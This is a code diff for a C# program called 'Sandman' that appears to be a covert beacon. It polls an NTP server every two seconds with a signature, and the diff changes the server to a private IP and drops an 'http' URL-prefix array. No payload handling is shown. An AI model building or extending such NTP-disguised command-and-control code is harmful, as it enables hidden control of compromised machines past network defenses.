@@ -9,8 +9,8 @@ namespace Sandman
     internal class Program
     {
         private const int defaultNtpMessageSize = 48;
-        private const string ntpServer = "time.windows.com";
-        // private const string ntpServer = "192.168.230.1";
+        // private const string ntpServer = "time.windows.com";
+        private const string ntpServer = "192.168.230.1";
         private const int ntpPort = 123;
         private const int timeout = 5000;
         private const int sleep = 2000;
@@ -19,7 +19,6 @@ namespace Sandman
         static void Main(string[] args) {
             IPAddress ntpServerAddress;
             var signature = new byte[] { 0x49, 0x44, 0x4f, 0x56, 0x33, 0x31 };
-            var urlPrefix = new byte[] { 0x68, 0x74, 0x74, 0x70 };
 
             // If using a DNS name: Getting the ip address.
             if (!IPAddress.TryParse(ntpServer, out ntpServerAddress))
@@ -30,12 +29,12 @@ namespace Sandman
             
             while (keepRunning)
             {
-                CheckIn(ipEndPoint, signature, urlPrefix);
+                CheckIn(ipEndPoint, signature);
                 Thread.Sleep(sleep);
             }
         }
 
-        static void CheckIn(IPEndPoint ipEndPoint, byte[] signature, byte[] urlPrefix)
+        static void CheckIn(IPEndPoint ipEndPoint, byte[] signature)
         {
             var ntpData = new byte[defaultNtpMessageSize];
             Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
